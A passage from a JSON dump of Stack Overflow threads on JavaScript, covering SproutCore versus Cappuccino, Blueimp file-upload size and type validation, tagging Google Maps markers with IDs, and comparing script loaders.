view has been rendered and you want to manipulate certain parts of the view based on an event, you can directly access to the DOM elements and manipulate their properties. Depending on where you are coming from this may seem good or bad. Good for those who are used to working with CSS and HTML and like the more direct control over how the views are rendered and styled. Bad if you want to generically render a view in order to make use of the best render approach based on what the browser allows (HTML/CSS, SVG, HTML5 canvas, etc). But, note, there are future plans to make SproutCore have a more abstract rendering approach but still allow you to directly work with HTML and CSS if you so choose. So you'll eventually get the best of both worlds.   </p>\n\n<p>Now, as for the stock UI widgets/views the two frameworks come with -- they both have a lot right out of the box in order to get you going. Buttons, labels, lists, segmented views, radio buttons, scrollers, etc -- they're all there. Therefore, it's safe to say you're fine in both camps.</p>\n\n<p>Going all the way back, let's now discuss the ease of use. To me, ease of use is based on you own personal experience working with JavaScript, HTML, Obj-C, Cocoa, other MVC frameworks, documentation, and community support. If you've never worked with Cocoa, or never built a decktop- or iPad-like app, then it's fair to say you're going to have a bit of a learning curve no matter what framework you choose. That being said, what you don't know and want to learn can be acquired through each framework's respective community and docs. Both have active communities in one for or another, so you won't be left out in the cold if you get stuck somewhere. As for docs, Cappuccino, admittedly, has the upper hand. The docs for SproutCore are lacking, but the code base is at least fully commented. The SproutCore community is fully aware of the docs needing to be updated, and it is currently something that is being dealt with, so keep checking.</p>\n\n<p>Finally, you mentioned the long-term forecast for the two frameworks. It's public knowledge that Motorola bought the Cappuccino framework, so you certainly have a big company backing its growth and longevity, or at least it seems like that way for now. As for Apple and SproutCore, I personally can't speak for them, but Apple does not own the framework. There are many companies and various individuals that all use and contribute back to the framework in some way. That might give some people and companies pause or discomfort for those who are looking at SproutCore due to the more organic nature of the framework's development, but I don't see that as a problem. My feeling is that both frameworks will be around for a long time, especially now that more are looking at developing next generation desktop and iPad apps using open source frameworks. And, hey, competition between the frameworks is good -- keeps everyone on their respective toes :-). </p>\n\n<p>Hope this information helps you out with your decision!</p>\n\n<p>Cheers,</p>\n\n<p>Mike</p>\n",
                    "is_accepted": true,
                    "score": 64
                },
                {
                    "body": "<p>Michael Cohens answer pretty much covered everything since it was extremely detailed. </p>\n\n<p>I have been struggling with a decision for the past 3 weeks. I have read everything there is out on the web about both frameworks and I have written a lot of source samples with both and still cannot make a decision. The following issues have me jumping from one framework to the other and keep making my decision tougher.</p>\n\n<ol>\n<li><p>Sproutcore has a better data store api than the one cappuccino has. </p></li>\n<li><p>Sproutcore makes use of bindings better than cappuccino currently does. Cappuccino does also have kvc/kvo support but bindings are not totally there yet. For example in sproutcore you can implement incremental loading with bindings and ArrayController very easily where on the other hand in cappuccino its not as straightforward. Of course cappuccino offers the CPTableView DataStore api which is pretty clean and can achieve similar results just not with bindings. Its what cocoa did before core data. Bindings are constantly being worked on in cappuccino though.</p></li>\n<li><p>Cappuccino has a better view api according to my personal taste. Although I am used to developing html and the DOM I much prefer the idea of abstracting the DOM completely away and getting rid of css. </p></li>\n<li><p>One issue that is really important to me is the lack of a good TableView in sproutcore. Currently SC.TableView is in alpha and it is not performant at all. I dont know of a timeline for the tableview in sproutcore. I tried asking on the irc sproutcore channel but got no satisfying answer. Cappuccino on the other hand has a great and very optimized table view.</p></li>\n<li><p>I have found more real world applications written on cappuccino than on sproutcore. There is also a pretty nice full blown application that is provided by cappuccino as a source sample and is very helpful. Check out <a href=\"http://githubissues.heroku.com/\" rel=\"nofollow\">http://githubissues.heroku.com/</a>.</p></li>\n</ol>\n\n<p>Despite the fact that I have no experience in objective-c and I much prefer the pure js syntax I will probably go with cappuccino on my current project and hope sproutcore comes out with a better table view in the future. </p>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>I wrote a blog article exactly about \"cappuccino vs. sproutcore\". It is not a technical comparison but compares other interesting data.</p>\n\n<p><a href=\"http://elii.info/2010/11/cappuccino-vs-sproutcore/\" rel=\"nofollow\">http://elii.info/2010/11/cappuccino-vs-sproutcore/</a></p>\n",
                    "is_accepted": false,
                    "score": 4
                },
                {
                    "body": "<p>I'd like to touch on the comments made about objective-j Michael.</p>\n\n<p>You're not going to lose anything if you drop down to JavaScript instead of objective-j. In all actuality the distinction is kind of difficult to make, especially in cases where we have toll-free bridged classes (more on that in a bit). </p>\n\n<p>Objective-j is really just a thin wrapper over js. It provides classical inheritance something that has traditionally been implemented as a language feature, which sproutcore implements as a framework feature, it also provides code importing, accessor generation, static scoping, and support for messaging nil. </p>\n\n<p>Objective-j instance variables are accessible via the traditional dot syntax if you want... I like to think of it like this: once you start writing a method, you're mostly writing JavaScript. That is, loops, variables, functions, closures, etc are all just javascript. You're not losing anything by dropping down, that's exactly how the language is designed. </p>\n\n<p>We take it a step further by \"toll-free bridging\" some of our classes CPDate, CPArray, CPException, CPString and perhaps more that I can't recall. Toll free bridging just means a CPArray IS a native js array, and a native js array is a CPArray, so you can use methods and functions of both world interchangeably. </p>\n\n<p>So for example would could do:</p>\n\n<pre><code>var foo = [];\n[foo addObject:\"bar\"];\nfoo.push(\"2nd push\");\nvar value = foo[0];\nvar value2 = [foo objectAtIndex:0];\n\nalert(value === value2); //true\n</code></pre>\n\n<p>As you can see I'm using objective-j syntax and js syntax together... You can imagine the power if this.</p>\n\n<p>The final thing I want to put out ther, just to make sure there is no confusion: objective-j gets parsed in the browser. It doesn't need to be compiled before hand (although we provide compilation tools for when you're ready to deploy your app). </p>\n\n<p>I think some people are needlessly put off by objective-j as if it's some monstrous beast that will take time to learn, and while objective-j adds a lot of great features to js, to actually learn them won't really take you the better part of a day if you're already familiar with object oriented programming, and obviously if you're coming from cocoa you'll be able to jump right in. </p>\n",
                    "is_accepted": false,
                    "score": 16
                }
            ],
            "body": "<p>Aside from the language differences Javascript vs. Objective-J what benefits does Cappuccino provide over SproutCore and vice-versa in your experiences?</p>\n\n<p>In terms of a long-term forecast, is SproutCore more \"supported\" than Cappuccino because it is backed by Apple?</p>\n\n<p>I am trying to choose between the two. I am both familiar with JavaScript and Objective-C.</p>\n",
            "last_activity_date": 1425146639,
            "question_id": 4287953,
            "score": 45,
            "tags": [
                "javascript",
                "model-view-controller",
                "cappuccino",
                "sproutcore",
                "objective-j"
            ],
            "title": "SproutCore vs. Cappuccino"
        },
        {
            "answer_count": 8,
            "answers": [
                {
                    "body": "<p>Had the same problem, and the blueimp guy says \"<a href=\"https://github.com/blueimp/jQuery-File-Upload/issues/760\">maxFileSize and acceptFileTypes are only supported by the UI version</a>\" and has provided a (broken) link to incorporate the _validate and _hasError methods.</p>\n\n<p>So without knowing how to incorporate those methods without messing up the script I wrote this little function. It seems to work for me.</p>\n\n<p>Just add this</p>\n\n<pre><code>add: function(e, data) {\n        var uploadErrors = [];\n        var acceptFileTypes = /^image\\/(gif|jpe?g|png)$/i;\n        if(data.originalFiles[0]['type'].length &amp;&amp; !acceptFileTypes.test(data.originalFiles[0]['type'])) {\n            uploadErrors.push('Not an accepted file type');\n        }\n        if(data.originalFiles[0]['size'].length &amp;&amp; data.originalFiles[0]['size'] &gt; 5000000) {\n            uploadErrors.push('Filesize is too big');\n        }\n        if(uploadErrors.length &gt; 0) {\n            alert(uploadErrors.join(\"\\n\"));\n        } else {\n            data.submit();\n        }\n},\n</code></pre>\n\n<p>at the start of the .fileupload options as shown in your code here</p>\n\n<pre><code>$(document).ready(function () {\n    'use strict';\n\n    $('#fileupload').fileupload({\n        add: function(e, data) {\n                var uploadErrors = [];\n                var acceptFileTypes = /^image\\/(gif|jpe?g|png)$/i;\n                if(data.originalFiles[0]['type'].length &amp;&amp; !acceptFileTypes.test(data.originalFiles[0]['type'])) {\n                    uploadErrors.push('Not an accepted file type');\n                }\n                if(data.originalFiles[0]['size'].length &amp;&amp; data.originalFiles[0]['size'] &gt; 5000000) {\n                    uploadErrors.push('Filesize is too big');\n                }\n                if(uploadErrors.length &gt; 0) {\n                    alert(uploadErrors.join(\"\\n\"));\n                } else {\n                    data.submit();\n                }\n        },\n        dataType: 'json',\n        autoUpload: false,\n        // acceptFileTypes: /(\\.|\\/)(gif|jpe?g|png)$/i,\n        // maxFileSize: 5000000,\n        done: function (e, data) {\n            $.each(data.result.files, function (index, file) {\n                $('&lt;p style=\"color: green;\"&gt;' + file.name + '&lt;i class=\"elusive-ok\" style=\"padding-left:10px;\"/&gt; - Type: ' + file.type + ' - Size: ' + file.size + ' byte&lt;/p&gt;')\n                .appendTo('#div_files');\n            });\n        },\n        fail: function (e, data) {\n            $.each(data.messages, function (index, error) {\n                $('&lt;p style=\"color: red;\"&gt;Upload file error: ' + error + '&lt;i class=\"elusive-remove\" style=\"padding-left:10px;\"/&gt;&lt;/p&gt;')\n                .appendTo('#div_files');\n            });\n        },\n        progressall: function (e, data) {\n            var progress = parseInt(data.loaded / data.total * 100, 10);\n\n            $('#progress .bar').css('width', progress + '%');\n        }\n    });\n});\n</code></pre>\n\n<p>You'll notice I added a filesize function in there as well because that will also only work in the UI version.</p>\n\n<p>Updated to get past issue suggested by @lopsided: Added <code>data.originalFiles[0]['type'].length</code> and <code>data.originalFiles[0]['size'].length</code> in the queries to make sure they exist and are not empty first before testing for errors. If they don't exist, no error will be shown and it will only rely on your server side error testing.</p>\n",
                    "is_accepted": true,
                    "score": 64
                },
                {
                    "body": "<p>open the file named \"jquery.fileupload-ui.js\", you will see the code like this:</p>\n\n<pre><code> $.widget('blueimp.fileupload', $.blueimp.fileupload, {\n\n    options: {\n        // By default, files added to the widget are uploaded as soon\n        // as the user clicks on the start buttons. To enable automatic\n        // uploads, set the following option to true:\n        acceptFileTypes: /(\\.|\\/)(gif|jpe?g|png)$/i,\n        autoUpload: false,\n        // The ID of the upload template:\n        uploadTemplateId: 'template-upload',\n        // The ID of the download template:\n        downloadTemplateId: 'template-download',\n        \u3002\u3002\u3002\u3002\n</code></pre>\n\n<p>just add one line code --- the new attribute \"acceptFileTypes\",like this:</p>\n\n<pre><code> options: {\n        // By default, files added to the widget are uploaded as soon\n        // as the user clicks on the start buttons. To enable automatic\n        // uploads, set the following option to true:\n        **acceptFileTypes: /(\\.|\\/)(gif|jpe?g|png)$/i,**\n        autoUpload: false,\n        // The ID of the upload template:\n        uploadTemplateId: 'template-upload',\n        // The ID of the download template:\n        downloadTemplateId: 'template-d\n</code></pre>\n\n<p>now  you'll see everything is allright!~\nyou just take the attribute with a wrong place.</p>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>You could also use an extra function like:</p>\n\n<pre><code>    function checkFileType(filename, typeRegEx) {\n        if (filename.length &lt; 4 || typeRegEx.length &lt; 1) return false;\n        var filenameParts = filename.split('.');\n        if (filenameParts.length &lt; 2) return false;\n        var fileExtension = filenameParts[filenameParts.length - 1];\n        return typeRegEx.test('.' + fileExtension);\n    }\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>You should include <a href=\"https://github.com/blueimp/jQuery-File-Upload/blob/master/js/jquery.fileupload-process.js\">jquery.fileupload-process.js</a> and <a href=\"https://github.com/blueimp/jQuery-File-Upload/blob/master/js/jquery.fileupload-validate.js\">jquery.fileupload-validate.js</a> to make it work.</p>\n",
                    "is_accepted": false,
                    "score": 24
                },
                {
                    "body": "<h2>A mi me funciono asi:en Firefox correctamente:</h2>\n\n<p>\"This works for me: it's correct in firefox.\"</p>\n\n<pre><code>$('#fileupload').fileupload({\n\n        dataType: 'json',\n        //acceptFileTypes: /(\\.|\\/)(xml|pdf)$/i,\n        //maxFileSize: 15000000,\n\n        add: function (e, data) {\n                var uploadErrors = [];\n\n                var acceptFileTypes = /\\/(pdf|xml)$/i;\n                if(data.originalFiles[0]['type'].length &amp;&amp; !acceptFileTypes.test(data.originalFiles[0]['type'])) {\n                    uploadErrors.push('Tipo de Archivo no Aceptado');\n                }\n\n                console.log(data.originalFiles[0]['size']) ;\n                if(data.originalFiles[0]['size'] &gt; 5000000) {\n\n                    uploadErrors.push('Tama\u00f1o de Archivo demasiado Grande');\n                }\n                if(uploadErrors.length &gt; 0) {\n                    alert(uploadErrors.join(\"\\n\"));\n                } else {\n            data.context = $('&lt;p/&gt;').text('Subiendo...').appendTo(document.body);\n            data.submit();\n                }\n\n        },\n        done: function (e, data) {\n            data.context.text('Exito!.');\n        }\n    });\n});\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>Checked/Valid example for:</p>\n\n<ul>\n<li>multiple file inputs</li>\n<li>for one or <strong>MULTIPLE FILES</strong> upload - <code>$.grep()</code> to remove files from array with errors</li>\n<li><code>image</code> and <code>audio</code> format</li>\n<li>dynamic file types from string by <code>new RegExp()</code></li>\n</ul>\n\n<p>Notice: <code>acceptFileTypes.test()</code> - check mime types, for adio file like <code>.mp3</code> it will be <code>audio/mpeg</code> - not only extenstion. For all blueimp options: <a href=\"https://github.com/blueimp/jQuery-File-Upload/wiki/Options\" rel=\"nofollow\">https://github.com/blueimp/jQuery-File-Upload/wiki/Options</a></p>\n\n<pre><code>$('input[type=\"file\"]').each(function(i){\n\n    // .form_files is my div/section of form for input file and progressbar\n    var $progressbar = $(this).parents('.form_files:first').find('.progress-bar:first');\n\n    var $image_format = 'jpg|jpeg|jpe|png|gif';\n    var $audio_format = 'mp3|mpeg';\n    var $all_formats = $image_format + '|' + $audio_format;\n\n    var $image_size = 2;\n    var $audio_size = 10;\n    var mb = 1048576;\n\n    $(this).fileupload({\n        // ...\n        singleFileUploads: false,   // &lt;&lt; send all together, not single\n        // ...\n        add: function (e, data) {\n\n            // array with all indexes of files with errors\n            var error_uploads_indexes = [];\n\n            // when add file - each file\n            $.each(data.files, function(index, file) {\n\n                // array for all errors\n                var uploadErrors = [];\n\n\n                // validate all formats first\n                if($all_formats){\n\n                    // check all formats first - before size\n                    var acceptFileTypes = \"(\\.|\\/)(\" + $all_formats + \")$\";\n                    acceptFileTypes = new RegExp(acceptFileTypes, \"i\");\n\n                    // when wrong format\n                    if(data.files[index]['type'].length &amp;&amp; !acceptFileTypes.test(data.files[index]['type'])) {\n                        uploadErrors.push('Not an accepted file type');\n\n                    }else{\n\n                        // default size is image_size\n                        var $my_size = $image_size;\n\n                            // check audio format\n                            var acceptFileTypes = \"(\\.|\\/)(\" + $audio_format + \")$\";\n                            acceptFileTypes = new RegExp(acceptFileTypes, \"i\");\n\n                            // alert(data.files[index]['type']);\n                            // alert(acceptFileTypes.test('audio/mpeg'));\n\n                            // if is audio then size is audio_size\n                            if(data.files[index]['type'].length &amp;&amp; acceptFileTypes.test(data.files[index]['type'])) {\n                                $my_size = $audio_size;\n                            }\n\n                        // check size\n                        if(data.files[index]['size'] &gt; $my_size * mb) {\n                            uploadErrors.push('Filesize is too big');\n                        };\n                    };\n\n                }; // &lt;&lt; all_formats\n\n                // when errors\n                if(uploadErrors.length &gt; 0) {\n                    //  alert(uploadErrors.join(\"\\n\"));\n\n                    // mark index of error file\n                    error_uploads_indexes.push(index);\n                    // alert error\n                    alert(uploadErrors.join(\"\\n\"));\n\n                };\n\n            }); // &lt;&lt; each\n\n\n            // remove indexes (files) with error\n            data.files = $.grep( data.files, function( n, i ) {\n                return $.inArray(i, error_uploads_indexes) ==-1;\n            });\n\n\n            // if are files to upload\n            if(data.files.length){\n                // upload by ajax\n                var jqXHR = data.submit().done(function (result, textStatus, jqXHR) {\n                        //...\n                     alert('done!') ;\n                        // ...\n                });\n            } // \n\n        }, // &lt;&lt; add\n        progressall: function (e, data) {\n            var progress = parseInt(data.loaded / data.total * 100, 10);\n            $progressbar.css(\n                'width',\n                progress + '%'\n                );\n        }\n    }); // &lt;&lt; file_upload\n\n    //          \n}); // &lt;&lt; each input file\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>As suggested in an earlier answer, we need to include two additional files - <code>jquery.fileupload-process.js</code> and then <code>jquery.fileupload-validate.js</code> However as I need to perform some additional ajax calls while adding a file, I am subscribing to the <code>fileuploadadd</code> event to perform those calls. Regarding such a usage the author of this plugin <a href=\"https://github.com/blueimp/jQuery-File-Upload/issues/760#issuecomment-35675651\">suggested the following</a></p>\n\n<blockquote>\n  <p>Please have a look here:\n  <a href=\"https://github.com/blueimp/jQuery-File-Upload/wiki/Options#wiki-callback-options\">https://github.com/blueimp/jQuery-File-Upload/wiki/Options#wiki-callback-options</a></p>\n  \n  <blockquote>\n    <blockquote>\n      <p>Adding additional event listeners via bind (or on method with jQuery 1.7+) method is the preferred option to preserve callback settings by the jQuery File Upload UI version.</p>\n    </blockquote>\n  </blockquote>\n  \n  <p>Alternatively, you can also simply start the processing in your own callback, like this:\n  <a href=\"https://github.com/blueimp/jQuery-File-Upload/blob/master/js/jquery.fileupload-process.js#L50\">https://github.com/blueimp/jQuery-File-Upload/blob/master/js/jquery.fileupload-process.js#L50</a></p>\n</blockquote>\n\n<p>Using the combination of the two suggested options, the following code works perfectly for me</p>\n\n<pre><code>$fileInput.fileupload({\n    url: 'upload_url',\n    type: 'POST',\n    dataType: 'json',\n    autoUpload: false,\n    disableValidation: false,\n    maxFileSize: 1024 * 1024,\n    messages: {\n        maxFileSize: 'File exceeds maximum allowed size of 1MB',\n    }\n});\n\n$fileInput.on('fileuploadadd', function(evt, data) {\n    var $this = $(this);\n    var validation = data.process(function () {\n        return $this.fileupload('process', data);\n    });\n\n    validation.done(function() {\n        makeAjaxCall('some_other_url', { fileName: data.files[0].name, fileSizeInBytes: data.files[0].size })\n            .done(function(resp) {\n                data.formData = data.formData || {};\n                data.formData.someData = resp.SomeData;\n                data.submit();\n        });\n    });\n    validation.fail(function(data) {\n        console.log('Upload error: ' + data.files[0].error);\n    });\n});\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 6
                },
                {
                    "body": "<p>Just an example of event handler for Add event. Assumes that singleFileUploads option is enabled (which is the default).  Read more jQuery File Upload documentation how to bound with add/fileuploadadd event. Inside loop you can use both vars <strong>this</strong> or <strong>file</strong>. An example of getting size property: <strong>this['size']</strong> or <strong>file.size</strong>.</p>\n\n<pre><code>    /**\n     * Handles Add event\n     */\n    base.eventAdd = function(e, data) {\n\n        var errs = [];\n        var acceptFileTypes = /(\\.|\\/)(gif|jpe?g|png)$/i;\n        var maxFileSize = 5000000;\n\n        // Validate file\n        $.each(data.files, function(index, file) {\n            if (file.type.length &amp;&amp; !acceptFileTypes.test(file.type)) {\n                errs.push('Selected file \"' + file.name + '\" is not alloawed. Invalid file type.');\n            }\n            if (this['size'] &gt; maxFileSize) {\n                errs.push('Selected file \"' + file.name + '\" is too big, ' + parseInt(file.size / 1024 / 1024) + 'M.. File should be smaller than ' + parseInt(maxFileSize / 1024 / 1024) + 'M.');\n            }\n        });\n\n        // Output errors or submit data\n        if (errs.length &gt; 0) {\n            alert('An error occured. ' + errs.join(\" \"));\n        } else {\n            data.submit();\n        }\n    };\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I'm using Blueimp jQuery file upload plugin for upload files.</p>\n\n<p>I had no problem in uploading but the option <code>maxFileSize</code> and <code>acceptFileTypes</code> do not work.</p>\n\n<p>This is my code:</p>\n\n<pre><code>$(document).ready(function () {\n    'use strict';\n\n    $('#fileupload').fileupload({\n        dataType: 'json',\n        autoUpload: false,\n        acceptFileTypes: /(\\.|\\/)(gif|jpe?g|png)$/i,\n        maxFileSize: 5000000,\n        done: function (e, data) {\n            $.each(data.result.files, function (index, file) {\n                $('&lt;p style=\"color: green;\"&gt;' + file.name + '&lt;i class=\"elusive-ok\" style=\"padding-left:10px;\"/&gt; - Type: ' + file.type + ' - Size: ' + file.size + ' byte&lt;/p&gt;')\n                    .appendTo('#div_files');\n            });\n        },\n        fail: function (e, data) {\n            $.each(data.messages, function (index, error) {\n                $('&lt;p style=\"color: red;\"&gt;Upload file error: ' + error + '&lt;i class=\"elusive-remove\" style=\"padding-left:10px;\"/&gt;&lt;/p&gt;')\n                    .appendTo('#div_files');\n            });\n        },\n        progressall: function (e, data) {\n            var progress = parseInt(data.loaded / data.total * 100, 10);\n\n            $('#progress .bar').css('width', progress + '%');\n        }\n    });\n});\n</code></pre>\n",
            "last_activity_date": 1424847385,
            "question_id": 17451629,
            "score": 40,
            "tags": [
                "javascript",
                "jquery",
                "file-upload",
                "blueimp",
                "jquery-file-upload"
            ],
            "title": "maxFileSize and acceptFileTypes in blueimp file upload plugin do not work. Why?"
        },
        {
            "answer_count": 4,
            "answers": [
                {
                    "body": "<p>Why not use an cache that stores each marker object and references an ID?</p>\n\n<pre><code>var markerCache= {};\nvar idGen= 0;\n\nfunction codeAddress(addr, contentStr){\n    // create marker\n    // store\n    markerCache[idGen++]= marker;\n}\n</code></pre>\n\n<p>Edit: of course this relies on a numeric index system that doesn't offer a length property like an array. You could of course prototype the Object object and create a length, etc for just such a thing. OTOH, generating a unique ID value (MD5, etc) of each address might be the way to go.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>I have a simple <code>Location</code> class that I use to handle all of my marker-related things. I'll paste my code below for you to take a gander at.</p>\n\n<p>The last line(s) is what actually creates the marker objects. It loops through some JSON of my locations, which look something like this:</p>\n\n<pre><code>{\"locationID\":\"98\",\"name\":\"Bergqvist J\u00e4rn\",\"note\":null,\"type\":\"retail\",\"address\":\"Smidesv\u00e4gen 3\",\"zipcode\":\"69633\",\"city\":\"Askersund\",\"country\":\"Sverige\",\"phone\":\"0583-120 35\",\"fax\":null,\"email\":null,\"url\":\"www.bergqvist-jb.com\",\"lat\":\"58.891079\",\"lng\":\"14.917371\",\"contact\":null,\"rating\":\"0\",\"distance\":\"45.666885421019\"}\n</code></pre>\n\n<p>Here is the code:</p>\n\n<p>If you look at the <code>target()</code> method in my Location class, you'll see that I keep references to the infowindow's and can simply <code>open()</code> and <code>close()</code> them because of a reference.</p>\n\n<p>See a live demo: <a href=\"http://ww1.arbesko.com/en/locator/\" rel=\"nofollow\">http://ww1.arbesko.com/en/locator/</a> (type in a Swedish city, like stockholm, and hit enter)</p>\n\n<pre><code>var Location = function() {\n    var self = this,\n        args = arguments;\n\n    self.init.apply(self, args);\n};\n\nLocation.prototype = {\n    init: function(location, map) {\n        var self = this;\n\n        for (f in location) { self[f] = location[f]; }\n\n        self.map = map;\n        self.id = self.locationID;\n\n        var ratings = ['bronze', 'silver', 'gold'],\n            random = Math.floor(3*Math.random());\n\n        self.rating_class = 'blue';\n\n        // this is the marker point\n        self.point = new google.maps.LatLng(parseFloat(self.lat), parseFloat(self.lng));\n        locator.bounds.extend(self.point);\n\n        // Create the marker for placement on the map\n        self.marker = new google.maps.Marker({\n            position: self.point,\n            title: self.name,\n            icon: new google.maps.MarkerImage('/wp-content/themes/arbesko/img/locator/'+self.rating_class+'SmallMarker.png'),\n            shadow: new google.maps.MarkerImage(\n                                        '/wp-content/themes/arbesko/img/locator/smallMarkerShadow.png',\n                                        new google.maps.Size(52, 18),\n                                        new google.maps.Point(0, 0),\n                                        new google.maps.Point(19, 14)\n                                    )\n        });\n\n        google.maps.event.addListener(self.marker, 'click', function() {\n            self.target('map');\n        });\n\n        google.maps.event.addListener(self.marker, 'mouseover', function() {\n            self.sidebarItem().mouseover();\n        });\n\n        google.maps.event.addListener(self.marker, 'mouseout', function() {\n            self.sidebarItem().mouseout();\n        });\n\n        var infocontent = Array(\n            '&lt;div class=\"locationInfo\"&gt;',\n                '&lt;span class=\"locName br\"&gt;'+self.name+'&lt;/span&gt;',\n                '&lt;span class=\"locAddress br\"&gt;',\n                    self.address+'&lt;br/&gt;'+self.zipcode+' '+self.city+' '+self.country,\n                '&lt;/span&gt;',\n                '&lt;span class=\"locContact br\"&gt;'\n        );\n\n        if (self.phone) {\n            infocontent.push('&lt;span class=\"item br locPhone\"&gt;'+self.phone+'&lt;/span&gt;');\n        }\n\n        if (self.url) {\n            infocontent.push('&lt;span class=\"item br locURL\"&gt;&lt;a href=\"http://'+self.url+'\"&gt;'+self.url+'&lt;/a&gt;&lt;/span&gt;');\n        }\n\n        if (self.email) {\n            infocontent.push('&lt;span class=\"item br locEmail\"&gt;&lt;a href=\"mailto:'+self.email+'\"&gt;Email&lt;/a&gt;&lt;/span&gt;');\n        }\n\n        // Add in the lat/long\n        infocontent.push('&lt;/span&gt;');\n\n        infocontent.push('&lt;span class=\"item br locPosition\"&gt;&lt;strong&gt;Lat:&lt;/strong&gt; '+self.lat+'&lt;br/&gt;&lt;strong&gt;Lng:&lt;/strong&gt; '+self.lng+'&lt;/span&gt;');\n\n        // Create the infowindow for placement on the map, when a marker is clicked\n        self.infowindow = new google.maps.InfoWindow({\n            content: infocontent.join(\"\"),\n            position: self.point,\n            pixelOffset: new google.maps.Size(0, -15) // Offset the infowindow by 15px to the top\n        });\n\n    },\n\n    // Append the marker to the map\n    addToMap: function() {\n        var self = this;\n\n        self.marker.setMap(self.map);\n    },\n\n    // Creates a sidebar module for the item, connected to the marker, etc..\n    sidebarItem: function() {\n        var self = this;\n\n        if (self.sidebar) {\n            return self.sidebar;\n        }\n\n        var li = $('&lt;li/&gt;').attr({ 'class': 'location', 'id': 'location-'+self.id }),\n            name = $('&lt;span/&gt;').attr('class', 'locationName').html(self.name).appendTo(li),\n            address = $('&lt;span/&gt;').attr('class', 'locationAddress').html(self.address+' &lt;br/&gt; '+self.zipcode+' '+self.city+' '+self.country).appendTo(li);\n\n        li.addClass(self.rating_class);\n\n        li.bind('click', function(event) {\n            self.target();\n        });\n\n        self.sidebar = li;\n\n        return li;\n    },\n\n    // This will \"target\" the store. Center the map and zoom on it, as well as \n    target: function(type) {\n        var self = this;\n\n        if (locator.targeted) {\n            locator.targeted.infowindow.close();\n        }\n\n        locator.targeted = this;\n\n        if (type != 'map') {\n            self.map.panTo(self.point);\n            self.map.setZoom(14);\n        };\n\n        // Open the infowinfow\n        self.infowindow.open(self.map);\n    }\n};\n\nfor (var i=0; i &lt; locations.length; i++) {\n    var location = new Location(locations[i], self.map);\n    self.locations.push(location);\n\n    // Add the sidebar item\n    self.location_ul.append(location.sidebarItem());\n\n    // Add the map!\n    location.addToMap();\n};\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>JavaScript is a dynamic language.  You could just add it to the object itself.</p>\n\n<pre><code>var marker = new google.maps.Marker(markerOptions);\nmarker.metadata = {type: \"point\", id: 1};\n</code></pre>\n\n<p>Also, because all v3 objects extend <a href=\"http://code.google.com/apis/maps/documentation/javascript/reference.html#MVCObject\"><code>MVCObject()</code></a>.  You can use:</p>\n\n<pre><code>marker.setValues({type: \"point\", id: 1});\n// or\nmarker.set(\"type\", \"point\");\nmarker.set(\"id\", 1);\nvar val = marker.get(\"id\");\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 97
                },
                {
                    "body": "<p>Marker already has unique id</p>\n\n<pre><code>marker.__gm_id\n</code></pre>\n",
                    "is_accepted": false,
                    "score": -1
                }
            ],
            "body": "<p>I have a script that loops and adds markers one at a time.</p>\n\n<p>I am trying to get the current marker to have an info window and and only have 5 markers on a map at a time (4 without info windows and 1 with)</p>\n\n<p>How would I add an id to each marker so that I can delete and close info windows as needed.</p>\n\n<p>This is the function I am using to set the marker:</p>\n\n<pre><code>function codeAddress(address, contentString) {\n\nvar infowindow = new google.maps.InfoWindow({\n  content: contentString\n});\n\nif (geocoder) {\n\n  geocoder.geocode( { 'address': address}, function(results, status) {\n\n    if (status == google.maps.GeocoderStatus.OK) {\n\n        map.setCenter(results[0].geometry.location);\n\n       var marker = new google.maps.Marker({\n          map: map, \n          position: results[0].geometry.location\n       });\n\n       infowindow.open(map,marker);\n\n      } else {\n       alert(\"Geocode was not successful for the following reason: \" + status);\n      }\n    });\n  }\n</code></pre>\n\n<p>}</p>\n",
            "last_activity_date": 1386400317,
            "question_id": 2564320,
            "score": 40,
            "tags": [
                "javascript",
                "google-maps"
            ],
            "title": "Adding ID&#39;s to google map markers"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>Pretty much all of them meet your needs, it just depends on your preference and whether you need some of the extra features they offer.</p>\n\n<p>Start with some comparison research:</p>\n\n<ul>\n<li><a href=\"http://www.quora.com/What-are-the-use-cases-for-RequireJS-vs-Yepnope-vs-LABjs\">http://www.quora.com/What-are-the-use-cases-for-RequireJS-vs-Yepnope-vs-LABjs</a></li>\n<li><a href=\"http://msdn.microsoft.com/en-us/magazine/hh227261.aspx\">http://msdn.microsoft.com/en-us/magazine/hh227261.aspx</a></li>\n<li><a href=\"http://www.netmagazine.com/features/essential-javascript-top-five-script-loaders\">http://www.netmagazine.com/features/essential-javascript-top-five-script-loaders</a></li>\n</ul>\n\n<p>That covers the main ones, but don't forget there are more script loaders around then you could possibly need - <a href=\"http://microjs.com/#loader\">http://microjs.com/#loader</a></p>\n\n<p>Personally I favour RequireJS but that's because I embrace the AMD format when building sites/applications. It might be overkill for simple script loading.</p>\n\n<p>Happy choosing</p>\n",
                    "is_accepted": false,
                    "score": 9
                },
                {
                    "body": "<p>FYI: if you are needing to load CSS files, my LABjs is not sufficient for that task, because I wrote it to be only a JS loader. Of course, dynamic CSS loading is not that hard to do yourself, unless you're trying to do detection of the CSS file finishing loading, which is a more intricate task. In a lot of cases, waiting for the CSS to finish loading is not as necessary as it may seem.</p>\n\n<p>To load a CSS file yourself (without load detection), it can be as simple as:</p>\n\n<pre><code>var css = document.createElement(\"link\");\ncss.rel = \"stylesheet\";\ncss.href = \"path/to/my.css\";\ndocument.head.appendChild(css);\n</code></pre>\n\n<p>headjs is abandonware. yepnope and requirejs are more sophisticated and handle lots of other scenarios besides simple script loading, including CSS loading as you need. The difference between those two would be if you care about AMD format (use requirejs) or not (use yepnope).</p>\n\n<p>The only other thing to consider is that not all script loaders (including those on this list and many others) pay as much attention to some of the intricacies of performance-optimized script loading as LABjs does. So, if you're strictly concerned about performance (and future-proof loading techniques), LABjs is, I think, a better choice. But given a broader desire to load other 